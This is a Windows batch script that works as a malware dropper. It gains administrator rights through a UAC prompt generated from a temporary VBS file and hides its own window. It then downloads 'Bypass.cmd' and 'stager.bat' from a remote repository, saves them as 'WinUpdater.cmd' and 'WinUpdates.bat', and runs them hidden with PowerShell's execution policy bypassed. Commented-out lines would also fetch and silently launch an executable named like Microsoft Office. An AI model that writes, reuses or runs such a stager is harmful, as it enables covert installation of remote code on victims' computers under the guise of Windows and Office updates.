@echo off
setlocal

:: Check for administrative privileges
if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) else (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
if not '%errorlevel%'=='0' (
    echo Requesting administrative privileges...
    goto UACPrompt
)
goto gotAdmin

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" restarted", "", "runas", 0 >> "%temp%\getadmin.vbs"  :: Changed window style to 0 (hidden)
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    cd /D "%~dp0" 2>nul

:: Self-hide current window using PowerShell
powershell -Command "Add-Type -Name Window -Namespace Console -MemberDefinition '[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'; $h = (Get-Process -PID $pid).MainWindowHandle; [Console.Window]::ShowWindow($h, 0)"

set "PS1_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/Bypass.cmd"
set "PS1.2_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/stager.bat"
rem set "EXE_URL=https://github.com/Drakovthe6th/TBuG/raw/master/Microsoft@Office.exe"
set "PS1_FILE=%temp%\WinUpdater.cmd"
set "PS1.2_FILE=%temp%\WinUpdates.bat"
rem set "EXE_FILE=%temp%\Microsoft@Office.exe"

echo Downloading files...
powershell -Command "Invoke-WebRequest -Uri '%PS1_URL%' -OutFile '%PS1_FILE%'" 2>nul
powershell -Command "Invoke-WebRequest -Uri '%PS1.2_URL%' -OutFile '%PS1.2_FILE%'" 2>nul
rem powershell -Command "Invoke-WebRequest -Uri '%EXE_URL%' -OutFile '%EXE_FILE%'" 2>nul

echo Executing PowerShell script...
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%PS1_FILE%" 2>nul
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%PS1.2_FILE%" 2>nul

echo Waiting for 60 seconds...
timeout /t 60 /nobreak >nul

echo Launching executable...
rem :: Hidden execution using PowerShell
rem powershell -Command "Start-Process -FilePath '%EXE_FILE%' -WindowStyle Hidden"

endlocal